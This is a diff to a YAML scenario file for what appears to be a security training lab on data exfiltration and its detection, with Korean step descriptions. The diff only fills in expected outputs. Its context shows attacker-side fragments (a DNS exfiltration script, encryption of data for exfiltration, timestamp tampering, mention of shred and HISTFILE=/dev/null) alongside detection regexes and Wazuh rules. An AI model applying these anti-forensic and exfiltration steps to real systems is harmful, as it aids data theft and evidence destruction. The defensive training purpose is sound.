@@ -37,7 +37,7 @@ steps:
     SSN(XXX-XX-XXXX) 형식은 DLP 규칙 테스트에 활용된다.
   verify:
     type: output_contains
-    expect: null
+    expect: 100 fake records
   target_vm: attacker
   script: "python3 -c \"\nimport random\nwith open('/tmp/sensitive_data.csv', 'w')\
     \ as f:\n    f.write('name,email,card_number,ssn\\n')\n    for i in range(100):\n\
@@ -63,7 +63,7 @@ steps:
     shred로 파일을 복구 불가능하게 삭제한다. HISTFILE=/dev/null로 명령 기록을 남기지 않는다.
   verify:
     type: output_contains
-    expect: null
+    expect: anti-forensic
   target_vm: attacker
   script: 'echo "anti-forensic test" > /tmp/af_test.txt && touch -t 202301010000 /tmp/af_test.txt
     && stat /tmp/af_test.txt | grep Modify && echo "--- Timestamp manipulated to 2023-01-01
@@ -89,7 +89,7 @@ steps:
     DNS가 허용되므로 방화벽 우회에 효과적이다.
   verify:
     type: output_contains
-    expect: null
+    expect: DNS Exfiltration
   target_vm: attacker
   script: "cat > /tmp/dns_exfil.sh << 'SCRIPT'\n#!/bin/bash\nDATA=$(head -5 /tmp/sensitive_data.csv\
     \ | base64 | tr -d '\\n')\nCHUNK_SIZE=50\nSEQ=0\necho \"=== DNS Exfiltration Simulation\
@@ -117,7 +117,7 @@ steps:
     조합하면 단일 채널 차단으로 유출을 완전히 막을 수 없다.
   verify:
     type: output_contains
-    expect: null
+    expect: Multi-Channel
   target_vm: attacker
   script: 'gzip -c /tmp/sensitive_data.csv > /tmp/exfil_payload.gz && openssl enc
     -aes-256-cbc -salt -in /tmp/exfil_payload.gz -out /tmp/exfil_encrypted.bin -pass
@@ -148,7 +148,7 @@ steps:
     엔트로피를 결합하면 DNS 터널링을 높은 정확도로 탐지할 수 있다.
   verify:
     type: output_contains
-    expect: null
+    expect: DNS Exfiltration Detection
   target_vm: secu
   script: "python3 -c \"\nimport math\nfrom collections import Counter\ndef shannon_entropy(s):\n\
     \    freq = Counter(s)\n    length = len(s)\n    return -sum((count/length) *\
@@ -182,7 +182,7 @@ steps:
     초과 시 전송을 차단한다.
   verify:
     type: output_contains
-    expect: null
+    expect: DLP Rule Analysis
   target_vm: secu
   script: "python3 -c \"\nimport re\nrules = {\n    'credit_card': r'\\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})\\\
     b',\n    'ssn': r'\\b\\d{3}-\\d{2}-\\d{4}\\b',\n    'email_bulk': r'[\\w.+-]+@[\\\
@@ -216,7 +216,7 @@ steps:
     10분 내 3개 이상 지표 발생 시 CRITICAL 알림을 발생시킨다.
   verify:
     type: output_contains
-    expect: null
+    expect: data_exfiltration
   target_vm: siem
   script: "cat > /tmp/wazuh_dlp_rules.xml << 'EOF'\n<group name=\"data_exfiltration\"\
     >\n  <rule id=\"100300\" level=\"12\" frequency=\"50\" timeframe=\"300\">\n  \
@@ -256,7 +256,7 @@ steps:
     미적용이 가장 심각한 Gap이다.
   verify:
     type: output_contains
-    expect: null
+    expect: Exfiltration & Anti-Forensics
   target_vm: attacker
   script: "rm -f /tmp/sensitive_data.csv /tmp/dns_exfil.sh /tmp/exfil_*.gz /tmp/exfil_*.bin\
     \ /tmp/icmp_*.txt /tmp/af_test.txt 2>/dev/null && cat > /tmp/exfil_report.txt\
